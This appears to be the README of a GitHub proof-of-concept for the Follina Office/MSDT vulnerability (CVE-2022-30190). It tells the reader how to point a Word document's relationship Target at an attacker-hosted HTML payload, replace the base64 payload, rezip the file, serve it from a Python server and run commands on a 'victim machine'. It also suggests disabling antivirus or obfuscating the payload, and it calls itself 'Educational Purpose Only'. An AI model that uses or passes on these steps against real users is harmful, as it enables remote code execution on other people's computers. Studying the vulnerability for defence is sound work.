# POC-msdt-Follina

OK, as you know, or don't know, CVE-2022-30190 vulnerability can be described as like an attacker makes some MS Office, puts inside it's structure some link ( html ), and with the help of that, he manage run a malicious code. OLE object (word/_rels/document.xml.rels)
<br>
Data phat puts inside, may describe link in the tags with attributes "TYPE=" and "Target=". Link at the target attribute takes to the HTML, which in our case is our PAYLOAD, so that triggers the MSDT protocol. For example -- > "Target="http://Server-Host-Payload/Payload.html".

Now, when opened, the attacker document start to run, and trigger the MSDT.
The document can run even in ProtectedMode, and more - You dont even need macros enabled.

You can Modifiy the Payload at www, and insdert what ever you want, just to check it on your victim machine.
For example --- > After edit the file with Gedit, at [char]34+'[Some/Base64/Syntax/', you can replace it with another Payload of yours.


This Document is already put together, just for the POC, so all you have to change is the Payload script, which in our case is the 'index.htmn' site, which holds inside of it a '<script>' tags that stored our Payload, and secondly, at /doc/word/_rels directory, thtere is a file named 'document.xml.rels. Edit it, and replace the 'http://YourServer:8000/index.html' with yours.

  
 After made all of that, just rezip the doc file, you can use 7-zip of whatever you like, open a python server, and good luck. Was Tested on  Microsoft Office Document 2007 with no problems, tell me if you managed to get it work on new versions.
  
  For now, dont forget to de-active the real time protection/firewall, else you can obfuscate your PAYLOAD, but for this is all for now.
  # Educational Purpose Only!
  ![POC-test](https://user-images.githubusercontent.com/90532971/172916363-51b0b457-fb9a-44a2-994d-0f396c07e547.gif)

  # Usage
  Made a little py script which can help for these who have a little trouble.
  1. Put your local machine ip, with 'http' where the payload is, for example: http://Server:Port/Pay.html
  2. choose a command to be executed, for example: "notepad" or using ps scripts.
*Notice: When running the py script, you cannot run it again on the same 'www' directory and 'doc'.
  if you want to use it again, copy the  inside 'BackUp' directory again, and run the py again.
  
